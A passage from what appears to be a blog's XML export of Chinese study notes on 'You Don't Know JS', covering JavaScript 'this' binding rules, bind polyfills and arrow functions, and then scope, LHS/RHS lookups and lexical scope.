的宿主环境有时会提供一些非常特殊的函数，它们并没有这两个方法。但是这样的函数非常罕见，JavaScript 提供的绝大多数函数已经自己创建的函数都可以使用这两个方法。 它们的第一个参数是一个对象，是给 this 准备的，接着在调用函数时，将其绑定到 this.因为可以直接指定 this 对象，所以称之为显式绑定。 1234567function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2&#125;;foo.call(obj); // 2 通过 foo.call() 可以在调用 foo 时强制把它的 this 绑定到 obj 上。如果传入了一个原始值（字符串类型、布尔类型或者数字类型）来当做 this 的绑定对象，这个原始值会被转换成它的对象形式（也就是 new String(..)、new Boolean(..)、new Number(..)）。这通常被称为“装箱” 从 this 绑定的角度来说，call 和 apply 是一样的，区别在于参入的参数不一样，call 传入单个值，apply 可以传一个或者一个以上的以数组形式的值 可惜，显示绑定仍然无法解决之前提出的丢失绑定问题。 1.硬绑定 但是显示绑定的一个变种可以解决这个问题。 1234567891011121314function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2&#125;;var bar = function()&#123; foo.call(obj);&#125;bar; // 2setTimeout(bar,100); //2// 硬绑定的 bar 不可能再修改它的 thisbar.call(window); // 2 上面的例子创建了函数 bar()，并在它的内部手动调用了 foo.call(obj)，因此强制把 foo 的 this 绑定到了 obj上。之后无论如何调用函数 bar ,它总会手动在 obj 上调用 foo.这种绑定是一种显式的强制绑定，我们称之为硬绑定。 硬绑定的典型应用场景就是创建一个包裹函数，负责接口参数并返回值： 123456789101112function foo(something)&#123; console.log(this.a,something); return this.a + something;&#125;var obj = &#123; a:2&#125;;var bar = function()&#123; return foo.apply(obj,arguments);&#125;var b = bar(3); // 2 3console.log(b); // 5 另一中方法就是创建一个可以重复使用的辅助函数： 12345678910111213141516function foo(something)&#123; console.log(this.a,something); return this.a + something;&#125;// 简单的辅助绑定函数function bind(fn,obj)&#123; return function()&#123; return fn.apply(obj,arguments) &#125;&#125;var obj = &#123; a:2&#125;;var bar = bind(foo,obj);var b = bar(3);console.log(b); // 5 由于硬绑定是一种非常常用的模式，所有 ES5 提供了内置的方法 Funtion.prototype.bind,它的用法如下 12345678910function foo(something)&#123; console.log(this.a,something); return this.a + something;&#125;var obj = &#123; a:2&#125;;var bar = foo.bind(obj);var b = bar(3);console.log(b); // 5 bind(…)会返回一个硬编码的新函数，它会把你指定的参数设置为 this 的上下文并调用原始函数。 2.API 调用“上下文” 第三方库的许多函数，以及 JavaScript 语言和宿主环境中许多新的内置函数，都提供了一个可选的参数，通常被称为 “上下文”（context），其作用和 bind(..)一样，都是确保你的回调函数使用指定的 this，举个例子： 123456789function foo(el)&#123; console.log(el,this.id);&#125;var obj = &#123; id:'awesome'&#125;;// 调用 foo(..)时把 this 绑定到 obj[1,2,3].forEach(foo,obj);// 1 awesome 2 awesome 3 awesome 这些函数实际就是通过 call 或者 apply 实现了显式绑定，这样就可以少些一些代码。 new 绑定这是第四条规则也是最后一条 this 绑定规则。在传统的面向类的语言中，“构造函数”是类中的一些特殊方法，使用 new 初始化类时会调用类中的构造函数，通常的形式是这样的： 1something = new MyClass(..); JavaScript 也有一个 new 操作，使用方法看起来和那些面向类的语言是一样的，绝大多数中开发者都认为 JavaScript 中的 new 机制也和那些语言一样的，然后实则不同。 首先我们重新定义一个 JavaScript 中的构造函数，它只是一些使用 new 操作符时被调用的函数。它们并不会属于哪个类，也不会实例化一个类。实际上，它们甚至都不能说是一种特殊的函数类型，它们只是 被 new 操作符调用的普通函数而已。 举例来说，思考一下 Number（..）作为构造函数时的行为，ES5.1 中这样描述它 当 Number 在 new 表达式中被调用是，它只是一个构造函数：它会初始化新创建的对象 所以，包括内置对象函数（比如 Number(..)）在内的所有函数都可以用 new 来调用，这种函数调用被称为构造函数调用。这里有一个重要但是细微的区别：实际上并不存在所谓的“构造函数”，只有对函数的“构造调用”。 使用 new 来调用函数，或者说发生构造函数调用时，会自动执行下面的操作。 创建（构造）一个全新的对象 这个新对象会被执行 [[prototype]] 连接 这个新对象会绑定到函数调用的 this 如果函数没有返回其他对象，那么 new 表达式中的函数会自动返回这个新的对象 思考下面的代码： 12345function foo(a)&#123; this.a = a;&#125;var bar = new foo(2);console.log(bar.a); // 2 使用 new 来调用 foo(..)，我们会构造一个新对象并把它绑定到 foo(..)调用中的 this上。new 是最后一种可以影响函数调用时 this 绑定行为的方法，我们称之为 new 绑定。 优先级现在我们了解刀函数调用中 this 绑定的四条规则，需要做的是找到函数的调用位置并判断应当应用那条规则。但是，如果某个调用位置可以应用多条规则该怎么办？为了解决这个问题就必须给这些规则设定一个优先级。 毫无以为，默认绑定的优先级是这四条规则里面最低的，隐式和显式绑定哪个优先级更高，我们可以来测试一下： 12345678910111213141516function foo()&#123; console.log(this.a);&#125;var obj1 = &#123; a:2, foo:foo&#125;var ojb2 = &#123; a:3, foo:foo&#125;obj1.foo(); // 2obj2.foo(); // 3obj1.foo.call(obj2); // 3obj2.foo.call(obj1); // 2 可以看到，显式绑定优先级更高，也就是说在判断时应当先考虑是否可以存在显式绑定。 我们需要搞清楚 new 绑定和隐式绑定的优先级谁高谁低： 1234567891011121314151617function foo(something)&#123; this.a = something;&#125;var obj1 = &#123; foo:foo&#125;var obj2 = &#123;&#125;;obj1.foo(2);console.log(obj1.a); // 2obj1.foo().call(obj2,3);console.log(obj2.a); // 3var bar = new obj1.foo(4); console.log(obj1.a); // 2console.log(bar.a); // 4 可以看到 new 绑定比隐式绑定优先级高，但是 new 绑定和 显式绑定谁的优先级高呢？ new 和 call/apply 无法一起使用，因此无法通过 new foo.call(obj1) 来直接进行测试，但是可以用硬绑定测试它俩的优先级 回忆一下硬绑定是怎么工作的，Function.prototype.bind() 会创建一个新的包装函数，这个函数会忽略它当前的 this 绑定（无论绑定的对象是什么），并把我们提供的对象绑定到 this 上。 这样看起来硬绑定（也是显式绑定的一种）似乎比 new 绑定的优先级更高，无法使用 new 来控制 this 的绑定。让我们验证一下： 1234567891011function foo(something)&#123; this.a = something;&#125;var obj1 = &#123;&#125;;var bar = foo.bind(obj1);bar(2);console.log(obj1.a); // 2var baz = new bar(3);console.log(obj1.a); // 2console.log(baz.a); // 3 可以看到，bar 被硬绑定到obj1上，但是 new bar(3) 并没有像我们预计的那样把 obj1.a 修改为 3.相反，new 修改了硬绑定（到 obj1）调用 bar(..)中的 this.因为使用了 new 绑定，我们得到一个名字为 baz 的新对象，并且 baz.a 的值是3. 再来看看看之前介绍的“裸”辅助函数 bind: 12345function bind(fn,obj)&#123; return function()&#123; fn.apply(obj,arguments); &#125;&#125; 在辅助函数中 new 操作符的调用无法修改 this 绑定，但是在上一个例子中 new 的确修改了 this 绑定。实际上，ES5 中内置的 Function.prototype.bind(..)更加复杂，下面是 MDN 提供的一种 bind(..)的实现，为了方便我们阅读，作者进行了排版： 1234567891011121314151617181920if(!Function.prototype.bind)&#123; Function.prototype.bind = function(oThis)&#123; if(typeof this !== "function")&#123; // 与 ES5 最接近的内部的 IsCallbale 函数 throw new TypeError( "Function.prototype.bind -what is trying to be bound is not callable" ) &#125; var aArgs = Array.prototype.slice.call(arguments,1), fToBind = this, fNOP = function()&#123;&#125;, fBound = function()&#123; return fToBind.apply(this instanceof fNOP &amp;&amp; oThis ? this : oThis), aArgs.concat(Array.prototype.slice.call(arguments)); &#125; fNOP.prototype = this.prototype; fBound.prototype = new fNOP(); return fBound; &#125;&#125; 这种 bind(…) 是一种 polyfill 代码（主要用于旧浏览器的兼容，比如说在旧浏览器中使用没有内置 bind 函数），对于 new 使用的硬绑定函数来说，这段 polyfill 代码在旧浏览器和 ES5 内置的 bind（..）函数并不完全相同（后面介绍为什么要在 new 中使用硬绑定函数）。由于 polyfill 并不是内置函数，所以无法创建一个不包含 .prototype 的函数。因此会有一些副作用。如果你要在 new 中使用硬绑定函数并且依赖 polyfill 代码的话，一定要非常小心。 下面是 new 修改 this 的相关代码： 1234this instanceof fNOP &amp;&amp; oThis ? this : oThis// 以及fNOP.prototype = this.prototype;fBound.prototype = new fNOP(); 简单来说，这段代码会判断硬绑定函数是否被 new 调用，如果是的话就是用新创建的 this 来替换硬绑定 的this. 那么为什么要在 new 中使用硬绑定函数呢？直接使用普通函数不是更简单？ 之所以要在 new 中使用硬绑定函数，主要目的是预先设置函数的一些参数，这样在使用 new 初始化时就可以只传入其余的参数。bind（..）功能之一就是可以把除了第一个参数（第一个参数用于绑定 this）之外的其他参数都传给下一层的函数（这种技术称为“部分应用”，是“柯里化”的一种。关于柯里化更多的内容，可以查看这里）举例说明： 1234567function foo(p1,p2)&#123; this.val = p1 + p2;&#125;// 之所以使用 null 是因为这个例子中我们并不关心硬绑定的 this 是什么，反正使用 new 时，this会被修改var bar = foo.bind(null,"p1");var baz = new bar("p2");baz.val; 判断 this现在我们可以根据优先级来判断函数在某个调用位置应用的是哪些规则，可以按照下面的顺序来进行判断： 函数是否在 new 调用（new 绑定）？如果是的话 this 绑定 的是新创建的对象。 函数是否通过 call,apply(显示绑定)或者硬绑定调用？如果是的话，this绑定的是指定的对象 var bar = foo.call(obj2); 函数是否在某个上下文对象中调用（隐式绑定）？如果是的话，this 绑定的是那个上下文的对象 var bar = obj1.foo(); 如果都不是的话，使用默认绑定，如果在严格模式下，就绑定到 undefined ，否则绑定到全局对象。 var bar = foo; 对于正常函数来说，理解了这些知识就可以明白了 this 的绑定原理了，不过也有例外。 绑定例外规则总有例外，这里也是一样的。在某些应当应用其他绑定规则时，实际上应用的是默认绑定规则 被忽略的 this如果你把 null 或者 undefined 作为 this 的绑定对象传入 call、apply 或者 bind ，这些值在调用时会被忽略，实际应用到是默认的绑定规则： 12345function foo()&#123; console.log(this.a);&#125;var a = 2;foo.call(null); // 2 那么什么情况下会传入 null呢？ 一种非常常见的做法是使用 apply(..)来展开一个数组，并且当做参数传入一个函数。类似地，bind(..)可以对参数进行柯里化（预先设置一些参数），这种方法有时非常有效。 12345678function foo(a,b)&#123; console.log("a:"+a+",b:"+b);&#125;// 把数组展开成参数foo.apply(null,[2,3]); // a:2,b:3// 使用 bind(..)进行柯里化var bar = foo.bind(null,2);bar(3); // a:2,b:3 这两种方法都需要传入一个参数作为 this 的绑定对象，如果函数并不关心 this 的话，你仍然需要传入一个占位符，这时 null 可能是一个不错的选择，就像代码中所示那样。 ES6 中，可以用 Spread 展开符（…）替代 apply(..)来展开数组。foo(…[1,2]) 和 foo(1,2)是一样的，这样就可以避免不必要的 this 绑定。可惜在 ES6 中没有柯里化的先关语法，还是要使用 bind(…) 然而总是使用 null来忽略 this 绑定可能产生一些副作用，如果某个函数确实使用了 this (比如 第三方库中的一个函数)，那默认绑定规则就会 this 绑定到全局对象（在浏览器中这个对象是 window），这将导致不可预计的后果（比如修全局对象）。 显而易见，这种方式可能会导致许多难以分析和追踪的 bug. 更安全的 this 一种“更安全”的做法是传入一个特殊的对象，把 this 绑定到这个对象不会对你的程序产生任何副作用，就像网络（以及军队）一样。我们可以创建一个“DMZ”(demilitarized zone,非军事区)对象——它就是一个空的非委托的对象（委托后面会讲到）。 如果我们在忽略 this 绑定时总是传入一个DMZ 对象，那就不用担心了，因为任何对于 this 的使用都会被限制在这个空对象中，不会对全局对象产生任何影响。 由于这个对象是一个空对象，可以用自己喜欢的变量名来表示。不过建议使用比较特殊的。 在 JavaScript 中创建一个空对象最简单的方式都是 Object.creact(null).Object.create(null)和{}很像，但是并不会创建 Object.prototype 这个委托，所以它比{}还空。 12345678910function foo(a,b)&#123; console.log("a:"+a+",b:"+b);&#125;// 我们的 DMZ 空对象var ∅ = Object.create(null);// 把数组展开成参数foo.apply(∅ ,[2,3]); // a:2,b:3// 使用 bind(..)进行柯里化var bar = foo.bind(∅ ,2);bar(3); // a:2,b:3 使用变量名 ∅ 不仅让函数更加安全，还可以提高代码的可读性，因为 ∅ 表示”我希望this 是空的“，这比null 的含义更加清楚。 间接引用另一个需要注意的是，有可能（无意或者有意地）创建一个函数的“间接引用”，在这种情况下，调用这个函数会应用默认绑定规则。 间接引用最容易在赋值时发生： 12345678function foo()&#123; console.log(this.a);&#125;var a = 2;var o = &#123; a: 3, foo:foo &#125;var p = &#123; a: 4 &#125;;o.foo(); // 3(p.foo = o.foo)(); // 2 赋值表达式 p.foo = o.foo 的返回值是目标函数的引用，因此调用位置是 foo() 而不是 p.foo 或者 o.foo 根据之前说过的，这里会应用默认绑定。 对于默认绑定来说，决定 this 绑定对象的并不是调用位置是否处于 严格模式，而是函数体是否处于严格模式。如果函数体处于严格模式，this 会被绑定到 undefined ，否则 this 会被绑定到全局对象。 软绑定之前我们已经看到过了，硬绑定这种方式 把 this 强制绑定到指定的对象（除了使用 new 时），防止函数调用应用默认绑定规则。问题在于，硬绑定会大大降低函数的灵活性，使用硬绑定之后就无法使用隐式绑定或者显式绑定来修改 this。 如果可以给默认绑定指定一个全局对象和 undefined 以外的值，那就可以实现和绑定相同的效果，同时保留隐式绑定或者显式绑定修改 this 的功能。 可以通过一种被称为软板定的方法来实现我们想要的效果： 123456789101112if(!Function.prototype.softBind)&#123; Function.prototype.softBind = function(obj)&#123; var fn = this; // 捕获所有 curried 对象 var curried = [].slice.call(arguments,1); var bound = function()&#123; return fn.apply((!this || this === (window || global)?obj:this,curried.concat.apply(curried,arguments))); &#125; bound.prototype = Object.create(fn.prototype); return bound; &#125;&#125; 除了软绑定之外，softBind(…)其他原理和 ES5 内置的bind（…）类似。它会对指定的函数进行封装，首先检查调用时 this ,如果 this 绑定到全局对象或者 undefined ，那就把指定的默认对象 obj 绑定到 this，否则就不会修改 this.此外，这段代码还支持可选的柯里化 下面看这个函数的调用： 123456789101112131415function foo()&#123; console.log("name:"+this.name);&#125;var obj1 = &#123;name: "obj"&#125;, obj2 = &#123;name: "obj2"&#125;, obj3 = &#123;name: "obj3"&#125;;var fooOBJ = foo.softBind(obj);fooOBJ(); //name: objobj2.foo = foo.softBind(obj);obj2.foo(); // name: obj2fooOBJ.call(obj3); // name: obj3setTimeout(obj2.foo,10); // name: obj 可以看到，软绑定版本的 foo() 可以手动将 this 绑定到 obj2 或者 obj3 上，但如果应用默认绑定，则会把 this 绑定到 obj。 this 词法ES6中介绍了一种无法使用前面这些规则的特殊函数类型：箭头函数 箭头函数并不是使用 function 关键字定义的，而是使用被称为“胖箭头”的操作符 =&gt; 定义的，箭头函数不使用 this 的四种标准规则，而是更加外层（函数或者全局）作用域来决定 this. 看看箭头函数的词法作用域： 123456789101112131415function foo()&#123; // 返回一个箭头函数 return (a) =&gt;&#123; // this 继承来自 foo() console.log(a); &#125;&#125;var obj1 = &#123; a:2&#125;var obj2 = &#123; a:3&#125;var bar = foo.call(obj1);bar.call(obj2); // 2不是 3 foo() 内部创建的箭头函数会捕获调用时 foo() 的this。由于 foo() 的this 绑定到obj1 。bar(医用箭头函数的)this 也会绑定在 obj1,箭头函数的绑定无法被修改。（new 也不行） 箭头函数最常用于回调函数，例如事件处理器或者是定时器 12345678910function foo()&#123; setTimeout(()=&gt;&#123; // 这里的 this 在词法上继承自 foo() console.log(this.a): &#125;);&#125;var obj = &#123; a:2&#125;foo.call(obj); //2 虽然 self = this 和箭头函数看起来都可以取代 bind(…)，但从本质上讲，它们想替代的是 this 机制。 如果你经常编写 this 风格的代码，但是绝大部分时候都会使用 self = this 或者 箭头函数来否定 this 机制，那你或者应当： 只采用词法作用域并且完全抛弃错误 this 风格的代码 完全采用 this 风格，在必要时使用 bind(…)，尽量避免使用 self = this 和箭头函数 当然包含这两种风格的程序可以正常运行，大那是在同一个函数或者同一个程序汇总混合使用这两种风格通常会使得代码更难维护，并且可能也会更难编写。 小结如果要判断一个运行中函数的 this 绑定，就需要找到这个函数的直接调用位置。找到之后就可以顺序应用下面这四条规则来判断 this 的绑定对象。 由new 调用？绑定到新创建的对象 由call 或者 apply 、bind 调用？绑定到指定对象 由上下文对象调用？绑定到那个上下文对象 默认：在严格模式下绑定到 undefined ，否则绑定到全局对象 一定要注意，有些调用可能在无意或者有意使用 默认规则，如果想要更安全地忽略 this 绑定，可以使用一个DMZ 对象，比如 ∅ = Object.create(null);以保护全局对象。 ES6 中的箭头函数并不会使用四条规则，而是根据当前的词法作用域来决定 this,具体来说，箭头函数会继承外层函数调用的 this 绑定（无论 this 绑定到了什么）。这其实和 ES6 之前代码的 self = this 机制是一样的。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>你不知道的JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你不知道的JavaScript(上)——作用域和闭包]]></title>
    <url>%2F2019-01-15-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85.html</url>
    <content type="text"><![CDATA[这个系列的作品是上一次当当网有活动买的，记得是上一年九月份开学季的时候了。后面一直有其他的事情，或者自身一些因素，迟迟没有开封这本书。今天立下一个 flag，希望可以在两个月内看完并记录这个系列的三本书，保持学习的激情，不断弥补自己的基础不够扎实的缺点。 作者的github 书籍的购买链接，自己搜。 你不知道的JavaScript(上)——作用域和闭包作用域和闭包作用域是什么？ 几乎所有的编程语言的基本的功能之一，就是能够存变量当中的值，并且能对这个值进行访问和修改。事实上，正是这种存储和访问变量的值的能力将状态带给了程序。 将变量引入程序会产生几个意思的问题：这些变量存储在哪里，最重要的是我们怎么找到它们，这些问题说明需要设计一套良好的规则来存储变量，并且之后可以方便地找到这些变量，这套规则被称为作用域。 编译原理尽管经常将 JavaScript 归类为“动态”或者是“解释执行”语言，但事实上它是一门编译语言。与传统的编译语言不同的是它不是提前编译的，编译结果也不能在分布式系统中进行移植。尽管这样，JavaScript 引擎进行编译的步骤和传统的编译非常相似，在某些环节可能比预想的要复杂。 在传统的编译语言的流程中，程序中的一段源代码在执行之前会经历三个步骤，统称为“编译”。 分词/词法分析（Tokenizing/Lexing） 这个过程会将有字符组成的字符串分解成（对编译语言来说）有意义的代码块，这些代码块被称为词法单元（token）。例如：var a = 2;这段程序通常会被分解成下面的词法单元：var、a、=、2、;。空格是否会被当做词法单元，取决于空格在这门语言中是否有意义。 分词（toknizing） 和词法分析（Lexing）之间的区别是非常微妙的、晦涩的，主要差异在于词法单元的识别是通过有状态还是无状态的方式进行的。简单来说，如果词法单元生成器在判断 a 是一个独立的词法单元还是其他词法单元的一部分时，调用的是有状态的解析规则，那么这个过程就被称为词法分析 解析/语法分析（Parsing） 这个过程是将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结果的树。这个树被称为“抽象语法树”（Abstract Syntax Tree,AST）。var a = 2;的抽象语法树中可能会有一个叫做 VariableDeclaration的顶级节点，接下来是一个叫做 Identifier（它的值是2）的子节点，以及一个叫做 AssignmentExpression的子节点。AssignmentExpression节点有一个叫做 NumericLiteral（它的值是2）的子节点。 代码生成 将 AST 转换成可执行代码的过程被称为代码生成，这个过程与语言、目标平台等息息相关。抛开具体细节，简单地来说就是有某种方法可以将 var a = 2;的AST转化为一组机器指令，用来创建一个叫做 a 的变量（包括分配内存等），并将一个值存储在 a 中。 比起那些编译过程只有三个步骤的语言的编译器，JavaScript 引擎要复杂得多。例如，在语法分析和代码生成阶段有特定的步骤来对运行性能进行优化，包括对冗余元素进行优化等。 JavaScript 引擎不会有大量的时间来优化，因为与其他语言不同，JavaScript 的编译过程不是发生在构建之前的。大部分情况下编译发生在代码执行前的几微秒的时间内。也就是说，任何 JavaScript 代码片段在执行前都要进行编译（通常就在编译前）。因此，JavaScript 编译器首先会对 var a = 2;这段程序进行编译，然后做好执行它的准备，并且通常马上就会执行它。 理解作用域学习作用域的方式是将这个构成模拟成几个人物之间的对话，那么，由谁进行这场对话呢？ 演员表首先介绍将要参与 对程序 var a = 2;进行处理的过程中的演员 演员 描述 引擎 从头到尾负责整个JavaScript 程序的编译以及执行过程 编译器 引擎的好盆友之一，负责词法分析以及代码生成的脏活累活 作用域 引擎的另一位好盆友，负责收集并维护由所有声明的标识符（变量）组成的一系列查询，并实施一套非常严格的规则，确定当前执行的代码对这些标识符的访问权限 对话var a = 2; 编译器首先会将这段程序分解成词法单元，然后将会词法单元解析成一个树结构。但是当编译器开始进行代码生成时，它对这段代码的处理方式会与预期有所不同。可以合理地假设编译器所产生的代码能够用下面的伪代码进行概括：为一个变量分配一个内存，并将其命名为 a，然后将值 2 保存进这个变量。然而，这并不是完全正确的。 事实上编译器会进行以下处理 遇到 var a，编译器会询问作用域是否已经有一个该名称的变量存在同一个作用域的集合中，如果是，编译器会忽略该声明，继续编译；否则它会按要求作用域在当前作用域的集合中声明一个新的变量，并命名为 a. 接下来编译器会为引擎生成运行时需要的代码，这些代码被用来处理 a = 2这个赋值操作，引擎运行时会首先询问作用域，在当前的作用域集合中是否存在一个叫做 a 的变量，如果是 引擎会使用这个变量，如果没有，引擎会继续查找该变量 如果引擎最终找到了 a 变量，会将 2 赋值给它。否则引擎就会举手示意并抛出一个异常。 总结：变量的赋值过程会执行两个动作，首先编译器会在当前的作用域中声明一个变量（如果它之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。 编译器有话说编译器在编译过程中的第二步生成了代码，引擎执行它的时候，会通过查找变量 a 来判断它是否已声明过。查找的过程由作用域进行协助，但是引擎执行怎么样的查找，会影响最终的查找结果。 上面的例子中，引擎会对 变量 a 进行 LHS 或者 RHS 查找。当变量出现在赋值操作的左侧的时候进行 LHS 查询，否则进行 RHS。RHS查询与简单地查找某个变量的值是一样的道理，但是 LHS 查询则是试图找到变量的容器本身，从而可以对其进行赋值。从这个角度说，RHS 并不是真正意义上的 “赋值操作的右侧”，更准确的说是“非左侧”。 RSH（retrieve his source value）取到它的源值。 1234console.log(a);// 其中对a 的引用是 RHS 引用，因为这里 a 并没有赋值，相应的需要查找并取得a的值，这样才能将值传递给 console.log(..)a = 2;// 这里对 a 的引用则是 LHS 引用，因为实际上我们并不关心当前的值是什么，只是想要为 =2 这个赋值操作找到一个目标 LHS与RHS最好理解为，赋值操作的目标是谁（LHS）以及谁是赋值操作的源头（RHS）. 1234567// 思考这个程序function foo(a)&#123; console.log(a);&#125;foo(2);// 这里的 foo(...)函数的调用需要对 foo 进行 RHS 引用，意味着“去找 foo 的值，并把它给我”，并且（...）意味着 foo 的值需要被执行，因为它最好真的是一个函数类型的值！这里还有一个隐式 a = 2.这个操作发生在 2 被当做参数传给foo(...)函数时，2会被分配给参数 a,为了给参数a（隐式地）分配值，需要进行一次 LHS查询。这里还有对 a 进行的 RHS 的引用，并且将得到的值传给了 console.log(...)。console.log(...) 本身也需要一个应用才能执行，因此会对 console 对象进行 RHS 查询，并且检查得到的值中是否有一个叫做 log 的方法。// 最后在概念上可以理解为在 LHS 和 RHS 之间通过对 值2进行交互来将其传递给 log (...)（通过变量a的 RHS 查询）。假设在 log(...)函数的原生实现中它可以接受参数，在将2赋值给其中第一个（也许叫做 arg1）参数之前，这个参数需要进行 LHS 引用查询。 将函数声明 function foo(a){} 转为普通的变量声明和赋值，比如 var foo 、foo = function(a){}，这样这个函数声明将需要进行 LHS 查询。 然而还有一个重要的轻微差别，编译器可以在代码生成的同时处理声明和值的定义，比如在引擎执行代码时，并不会有线程专门来将一个函数值“分配给”foo.因此，将函数声明理解成前面讨论的 LHS 查询和赋值的形式并不合适。 引擎和作用域的对话1234function foo(a)&#123; console.log(a);&#125;foo(2); 对话： 12345678910111213引擎：作用域，我需要为foo 进行 RHS 引用，你有见过它吗？作用域：编译器刚刚声明了它，它是一个函数，给你！引擎：好的，我来执行一下 foo引擎：作用域，我现在需要给 a 进行 LHS 引用，这个你见过吗？作用域：这个也见过，编译器最近把它声明为 foo 的一个形式参数了，拿去吧引擎：那我现在把2赋值给 a引擎：我要为 console 进行 RHS 引用，你有过它吗？作用域：有呀，console 是内置对象，给你引擎：我看看里面是不是有 log（...），找到了，是一个函数。引擎：作用域，帮我再找一下 a 的 RHS 引用，虽然我记得它，但是我要再确认一次作用域：好的，这个变量没有变动过，给你引擎：好的，那我把 a 的值，也就是2 传递给 log(...)... 小测试检验一下到目前的理解程度，把自己当作引擎，和作用域进行一次“对话” 12345function foo(a)&#123; var b = a; return a + b;&#125;var c = foo(2); 找到其中的所有 LHS 查询（3处） 找出其中的所有 RHS 查询（4处） 我的理解： 123456789101112引擎：作用域，我需要为c进行 LHS 引用，你有见过它吗？作用域：编译器把它赋值为了一个 foo（2）执行函数了。引擎：好的，那我来为 foo(2) 进行 RHS 引用，来看看这个值是什么？引擎：作用域，我现在需要给 a 进行 LHS 引用，你有见过它吗？作用域：这个也见过，编译器最近把它声明为 foo 的一个形式参数了，拿去吧引擎：那我现在把 2 赋值给 a引擎：我现在要为 b 来进行 LHS 引用，而 a 的值来自于 b,那么我同时也要给 a 进行 RHS 引用，作用域你清楚吗？作用域：好的，找到 a 这个变量了，给你引擎：好的，那我把 a 的值也就是2赋值给 b。引擎：作用域，函数要返回 a + b，我需要给 a 和 b 进行 RHS 引用作用域：好的，这两个值，都没有变化，给你引擎：好的，那我将 a 和 b 的值相加后函数返回 作用域嵌套作用域是根据名称查找变量的一套规则，实际情况中，通常需要同时估计几个作用域。 当一个块或者函数嵌套在另一个块或者函数中时，就发生了作用域的嵌套。因此，在当前作用域中无法找到某个变量的时，引擎就会在外层嵌套的作用域中继续查找，直到找到该变量，或抵达最下层的作用域（也就是全局作用域）为止。 思考以下代码： 12345function foo(a)&#123; console.log(a + b);&#125;var b = 2;foo(2) //4 对 b进行的 RHS 引用无法在函数 foo 内部完成，但可以在上一级作用域完成。 回顾一下对话： 1234引擎：foo 的作用域，你见过 b 吗，我需要对它进行 RHS 引用作用域：没有引擎：全局作用域大哥，你有加过 b 吗，我需要对b 进行 RHS 引用。作用域：当然了，给你 遍历嵌套作用域链的规则很简单：引擎从当前的执行作用域开始查找变量，如果找不到，就向上一级继续查找。当抵达最外层的全局作用域时，无论是找到还是没有找到，查找过程都会停止。 异常为什么区分 LHS 和 RHS 是一件重要的事情？ 因为在变量还没有声明（任何作用域中都无法找到该变量）的情况下，这两种查询的行为是不一样的。 考虑下面的代码： 12345function foo(a)&#123; console.log(a + b); b = a;&#125;foo(2); 第一次对 b 进行 RHS 查询是无法找到该变量的，也就是说，这是一个“未声明”的变量，因为在任何相关的作用域中也无法找到它。 如果 RHS 查询在所有嵌套的作用域中遍寻不到所需的变量，引擎就会抛出 ReferenceError 异常，值得注意的是，ReferenceError 是非常重要的异常类型。 相较之下，当引擎执行 LHS 查询的时候，如果在顶层的（全局作用域）中也无法找到目标变量，全局作用域中就会创建一个具有该名称的变量，并将其返回给引擎，前提是程序运行在非严格模式下。在严格模式下，LHS 查询失败，并不会创建并返回一个全局变量，引擎会抛出跟 RHS 查询一样失败类似的 ReferenceError 异常。 接下来，如果 RHS 查询到了一个变量，但是尝试对这个变量进行不合理的操作，例如试图对一个非函数类型的值进行函数调用，或者引用 null 或者 undefined 类型的值中的属性，那么引擎会抛出另外一种类型的异常，叫做 TypeError。 ReferenceError 同作用域判别失败相关，而 TypeError 则代表作用域判别成功了，但是对结果的操作是非法或者不合理的。 小结作用域是一套规则，用于确定何处以及如何查找变量（标识符）。如果查找的目的是对变量进行赋值，那么就会使用 LHS 查询，如果目的是获取变量的值，就会使用 RHS 查询。赋值操作符会导致 LHS 查询。= 操作符或调动函数时传入参数的操作都会导致关联作用域的赋值操作。JavaScript 引擎首先会在代码执行前对其进行编译，在这个过程中，像 var a = 2这样的声明会被分解后才能两个独立的步骤： 首先， var a 在其作用域中声明新变量，这会在最开始的阶段，也就是代码执行前进行 接下来，a = 2 会查询（LHS 查询）变量 a 并对其进行赋值 LHS 和 RHS 查询都会在当前执行作用域中开始，如果有需要（也就是说它们没有周到所需的标识符），就会向上级作用域继续查找目标标识符，这样每次上升一级作用域（一层楼），最后抵达全局作用域（顶层），无论找到活没有找到都将停止。 不成功的 RHS 引用会导致抛出 RefenceError 异常。不成功的 LHS 引用会导致自动隐式地创建一个全局变量（非严格模式下），该变量使用 LHS 引用的目标作为标识符，或者抛出 ReferenceError 异常（严格模式下） 词法作用域我们将“作用域”定义为一套规则，这套规则用来管理引擎如何在当前作用域已经嵌套的子作用域中根据标识符名称进行变量查找。 作用域共有两种主要的工作模型。第一种是最为普遍的，被大多数编程语言所采用的词法作用域，另外一种叫做动态作用域，仍有一些编程语言在使用（例如bash,perl 中的一些模式）。 词法阶段第一章讲过，大部分标准语言编译器的第一个工作阶段叫做词法化（也叫单词化）。回忆一下，词法化的过程会对源代码中的字符进行检查，如果是有状态的解析过程，还会赋予单词语义。这个概念是理解词法作用域及其名称来历的基础。简单地说，词法作用域就是定义在词法阶段的作用域，词法作用域是由你在写代码时将变量和块作用域写在哪里来决定的，因此当词法分析器处理代码时会保持作用域不变（大部分情况下是这样的） 后面有一种欺骗词法作用域的方法，这些方法在词法分析器处理过后依然可以修改作用域，但是这种机制可能会难以理解。事实上，让词法作用域根据词法关系书写时的自然关系不变，是一个非常好的最佳实践 思考一下代码： 12345678function foo(a)&#123; var b = a * 2; function bar(c)&#123; console.log(a, b, c); &#125; bar(b*3)&#125;foo(2); // 2, 4, 12 在上面中例子中有三个逐级嵌套的作用域 包含整个全局作用域，其中只有一个标识符：foo 包含 foo 所创建的作用域：a、b、bar 包含 bar 所创建的作用域：c 这里的作用域是严格包含的，没有任何函数的作用域可以（部分）同时出现在两个外部作用域中，就如同没有任何函数可以部分出现在两个父级函数中一样。 查找作用域的结构和互相之间的位置关系给引擎提供了足够的信息，引擎用这些信息来查找标识符的位置。 上面的例子中，引擎执行 console.log(…) 声明，并查找了a、b和c三个变量的引用。它首先从最内部的作用域开始，也就是 bar(…)函数的作用域开始查找，引擎无法再这里找到 a,因为会去上一层 